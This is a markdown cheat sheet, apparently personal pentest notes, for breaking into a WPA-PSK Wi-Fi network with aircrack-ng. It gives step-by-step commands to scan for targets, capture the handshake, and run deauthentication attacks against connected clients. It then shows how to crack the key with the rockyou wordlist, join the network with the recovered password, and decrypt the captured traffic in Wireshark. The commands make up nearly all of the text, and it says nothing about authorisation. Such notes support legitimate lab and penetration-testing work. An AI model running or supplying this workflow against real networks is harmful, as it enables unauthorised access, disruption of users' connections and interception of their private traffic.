### Setup 

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```


### Gather handshake

Use the gathered channel and BSSID to dump the handshake specifically for the AP. Write this output to a cap file.
```bash
sudo airodump-ng -c <channel> -w wpa-handshake --essid <ESSID> --bssid <BSSID> wlan0mon -w /tmp/handshake
```

Launch a deauthentication attack to get the handshake for the AP. The MAC used is that of the AP:
```bash
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC> wlan0mon
sudo aireplay-ng -0 1 -a <BSSID> -c <MAC> wlan0mon
# Try without specifying MAC:
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
```
>[!info]
>Sometimes only deauthenticating once is better: `-0 1`


### Crack handshake

The key can be successfully cracked using a wordlist like rockyou.txt:
```bash
aircrack-ng -w /usr/share/john/password.lst wpa-handshake-01.cap
aircrack-ng -w /home/user/Downloads/rockyou.txt wpa-handshake-01.cap
```
>[!info]
>Other wordlist: `/usr/share/john/password.lst`


### Connect to the network

Start the NetworkManager service:
```bash
sudo service NetworkManager start
```

Set the interface up:
```bash
sudo ifconfig wlan1 up
```

Create the configuration file to connect to the network: `connect.config`
```bash
network={
  ssid="<ESSID>"
  scan_ssid=1
  psk="<PASSWORD>"
  key_mgmt=WPA-PSK
}
```

Use the configuration file to connect to the network:
```bash
sudo wpa_supplicant -i wlan1 -c connect.config
```

Obtain DHCP address:
```bash
sudo dhclient wlan1
```


### Capture & decrypt traffic

Decrypt traffic:
```bash
airdecap-ng -b <BSSID> -e <ESSID> -p <PASSWORD> /tmp/<file>.cap
```

Open the decrypted file in wireshark:
```bash
wireshark /tmp/<file>-dec.cap
```
